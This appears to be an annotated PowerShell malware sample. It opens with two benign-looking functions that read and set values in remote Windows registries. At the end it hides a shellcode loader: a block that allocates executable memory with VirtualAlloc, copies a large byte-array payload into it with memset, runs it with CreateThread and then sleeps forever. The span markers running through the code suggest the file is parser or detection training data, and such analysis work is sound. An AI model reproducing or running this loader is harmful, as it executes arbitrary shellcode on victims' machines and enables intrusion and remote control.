


 -||-> function Set-RemoteRegistry {
    param (
        $comp = $env:COMPUTERNAME,
        [ValidateSet('ClassesRoot', 'CurrentUser', 'LocalMachine', 'Users', 'PerformanceData', 'CurrentConfig', 'DynData')]
        [string]$hive = 'LocalMachine',
        [string]$key = $(Throw  -||-> 'No Key provided' <-||- ),
        [ValidateSet('Binary', 'DWord', 'ExpandString', 'MultiString', 'None', 'QWord', 'String', 'Unknown')]
        [string]$type,
        [string]$value = $(Throw  -||-> 'No Value provided' <-||- ),
        [string]$data,
        [switch]$delete = $false
    )

     -||-> $registry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($hive, $comp).OpenSubKey($key, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree) <-||- 

     -||-> if ( -||-> !$delete <-||- ) {
         -||-> try {
             -||-> $registry.SetValue($value, $data, $type) <-||- 
             -||-> [pscustomobject]@{
                Computer =  -||-> $comp <-||- ;
                    Hive =  -||-> $hive <-||- ;
                     Key =  -||-> $key <-||- ;
                   Value =  -||-> $value <-||- ;
                    Data =  -||-> $data <-||- ;
                    Type =  -||-> $type <-||- ;
                  Delete =  -||-> $delete <-||- 
            } <-||- 
        } catch {
             -||-> write-error $error[0] <-||- 
            return
        } <-||- 
    } else {
         -||-> try {
             -||-> $registry.DeleteValue($value) <-||- 
             -||-> [pscustomobject]@{
                Computer =  -||-> $comp <-||- ;
                    Hive =  -||-> $hive <-||- ;
                     Key =  -||-> $key <-||- ;
                   Value =  -||-> $value <-||- ;
                    Data =  -||-> $data <-||- ;
                    Type =  -||-> $type <-||- ;
                  Delete =  -||-> $delete <-||- 
            } <-||- 
        } catch {
             -||-> write-error $error[0] <-||- 
            return
        } <-||- 
    } <-||- 
} <-||- 

 -||-> function Get-RemoteRegistry {
    param (
        $comps = $env:COMPUTERNAME,
        [ValidateSet('ClassesRoot', 'CurrentUser', 'LocalMachine', 'Users', 'PerformanceData', 'CurrentConfig', 'DynData')]
        [string]$hive = 'LocalMachine',
        [string[]]$keys = '',
        $subs = $true
    )

     -||-> foreach ($comp in  -||-> $comps <-||- ) {
         -||-> $registry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($hive, $comp) <-||- 
         -||-> foreach ($key in  -||-> $keys <-||- ) {
             -||-> if ( -||-> $subs <-||- ) {
                 -||-> $subkeys = $registry.OpenSubKey($key).GetSubKeyNames() <-||- 
                 -||-> foreach ($subkey in  -||-> $subkeys <-||- ) {
                     -||-> try{  -||-> $subregistry = $registry.OpenSubKey("$key\$subkey") <-||-  }catch{} <-||- 
                     -||-> $hash = @{} <-||- 
                     -||-> $hash.Add('RegKeyName', $subkey) <-||- 
                     -||-> try{  -||-> $hash.Add('RegKeyParent', $key) <-||-  }catch{} <-||- 
                     -||-> try{  -||-> $hash.Add('RegKeyChildren', $subregistry.GetSubKeyNames()) <-||-  }catch{} <-||- 
                     -||-> try{  -||-> $names = $subregistry.GetValueNames() <-||-  }catch{} <-||- 
                     -||-> foreach ($name in  -||-> ( -||-> $names | ? { -||-> $_ <-||- } <-||- ) <-||- ) {
                         -||-> $hash.Add($name, $(
                             -||-> [pscustomobject]@{
                                Type =  -||-> $subregistry.GetValueKind($name) <-||- 
                                Value =  -||-> $subregistry.GetValue($name) <-||- 
                            } <-||- 
                        )) <-||- 
                    } <-||- 
                     -||-> [pscustomobject]$hash <-||- 
                } <-||- 
            } else {
                 -||-> try{  -||-> $subregistry = $registry.OpenSubKey($key) <-||-  }catch{} <-||- 
                 -||-> $hash = @{} <-||- 
                 -||-> $hash.Add('RegKeyName', $( -||-> Split-Path $subregistry -Leaf <-||- )) <-||- 
                 -||-> try{  -||-> $hash.Add('RegKeyParent', $( -||-> Join-Path $hive ( -||-> Split-Path $key <-||- ) <-||- )) <-||-  }catch{} <-||- 
                 -||-> try{  -||-> $hash.Add('RegKeyChildren', $subregistry.GetSubKeyNames()) <-||-  }catch{} <-||- 
                 -||-> try{  -||-> $names = $subregistry.GetValueNames() <-||-  }catch{} <-||- 
                 -||-> foreach ($name in  -||-> ( -||-> $names | ? { -||-> $_ <-||- } <-||- ) <-||- ) {
                     -||-> $hash.Add($name, $(
                         -||-> [pscustomobject]@{
                            Type =  -||-> $subregistry.GetValueKind($name) <-||- 
                            Value =  -||-> $subregistry.GetValue($name) <-||- 
                        } <-||- 
                    )) <-||- 
                } <-||- 
                 -||-> [pscustomobject]$hash <-||- 
            } <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> $m00 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $m00 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0xbf,0xf8,0xf7,0x47,0x88,0x83,0xc0,0x04,0x31,0x78,0x14,0x03,0x78,0xec,0x15,0xb2,0x74,0xe4,0x58,0x3d,0x85,0xf4,0x3c,0xb7,0x60,0xc5,0x7c,0xa3,0xe1,0x75,0x4d,0xa7,0xa4,0x79,0x26,0xe5,0x5c,0x0a,0x4a,0x22,0x52,0xbb,0xe1,0x14,0x5d,0x3c,0x59,0x64,0xfc,0xbe,0xa0,0xb9,0xde,0xff,0x6a,0xcc,0x1f,0x38,0x96,0x3d,0x4d,0x91,0xdc,0x90,0x62,0x96,0xa9,0x28,0x08,0xe4,0x3c,0x29,0xed,0xbc,0x3f,0x18,0xa0,0xb7,0x19,0xba,0x42,0x14,0x12,0xf3,0x5c,0x79,0x1f,0x4d,0xd6,0x49,0xeb,0x4c,0x3e,0x80,0x14,0xe2,0x7f,0x2d,0xe7,0xfa,0xb8,0x89,0x18,0x89,0xb0,0xea,0xa5,0x8a,0x06,0x91,0x71,0x1e,0x9d,0x31,0xf1,0xb8,0x79,0xc0,0xd6,0x5f,0x09,0xce,0x93,0x14,0x55,0xd2,0x22,0xf8,0xed,0xee,0xaf,0xff,0x21,0x67,0xeb,0xdb,0xe5,0x2c,0xaf,0x42,0xbf,0x88,0x1e,0x7a,0xdf,0x73,0xfe,0xde,0xab,0x99,0xeb,0x52,0xf6,0xf5,0xd8,0x5e,0x09,0x05,0x77,0xe8,0x7a,0x37,0xd8,0x42,0x15,0x7b,0x91,0x4c,0xe2,0x7c,0x88,0x29,0x7c,0x83,0x33,0x4a,0x54,0x47,0x67,0x1a,0xce,0x6e,0x08,0xf1,0x0e,0x8f,0xdd,0x6c,0x0a,0x07,0xd4,0x70,0x16,0xd8,0x80,0x72,0x16,0xf7,0x0c,0xfa,0xf0,0xa7,0xfc,0xac,0xac,0x07,0xad,0x0c,0x1d,0xef,0xa7,0x82,0x42,0x0f,0xc8,0x48,0xeb,0xa5,0x27,0x25,0x43,0x51,0xd1,0x6c,0x1f,0xc0,0x1e,0xbb,0x65,0xc2,0x95,0x48,0x99,0x8c,0x5d,0x24,0x89,0x78,0xae,0x73,0xf3,0x2e,0xb1,0xa9,0x9e,0xce,0x27,0x56,0x09,0x99,0xdf,0x54,0x6c,0xed,0x7f,0xa6,0x5b,0x66,0x49,0x32,0x24,0x10,0xb6,0xd2,0xa4,0xe0,0xe0,0xb8,0xa4,0x88,0x54,0x99,0xf6,0xad,0x9a,0x34,0x6b,0x7e,0x0f,0xb7,0xda,0xd3,0x98,0xdf,0xe0,0x0a,0xee,0x7f,0x1a,0x79,0xee,0xbc,0xcd,0x47,0x84,0xac,0xcd <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $UmM=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $UmM.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$UmM,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



